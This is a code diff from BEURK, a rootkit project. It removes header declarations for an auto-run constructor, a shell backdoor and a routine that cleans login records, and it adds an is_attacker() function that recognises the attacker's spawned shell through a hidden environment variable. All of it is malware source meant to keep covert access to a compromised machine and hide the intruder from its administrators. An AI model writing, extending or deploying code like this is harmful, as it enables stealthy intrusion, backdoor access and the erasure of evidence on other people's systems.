@@ -18,21 +18,29 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <stdbool.h>
+#include "beurk.h"
 
-#include <sys/socket.h>
-#include "hooks.h"
-#include "config.h"
-#include "debug.h"
+/** is_attacker() checks if the process is called by the attacker,
+ * using a special environment variable that is defined in our
+ * spawned shell.
+ */
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+int is_attacker(void) {
+    static int attacker = -1;
 
-/* is_attacker.c */
-int         is_attacker(void);
+    if (attacker != -1)
+        return (attacker);
 
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
+    DEBUG(D_INFO, "Checking if this is the attacker...");
 
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
+    if (getenv(HIDDEN_ENV_VAR)) {
+        DEBUG(D_INFO, "This is the attacker.");
+        attacker = 1;
+    }
+    else {
+        DEBUG(D_INFO, "This isn't the attacker.");
+        attacker = 0;
+    }
+    return (attacker);
+}
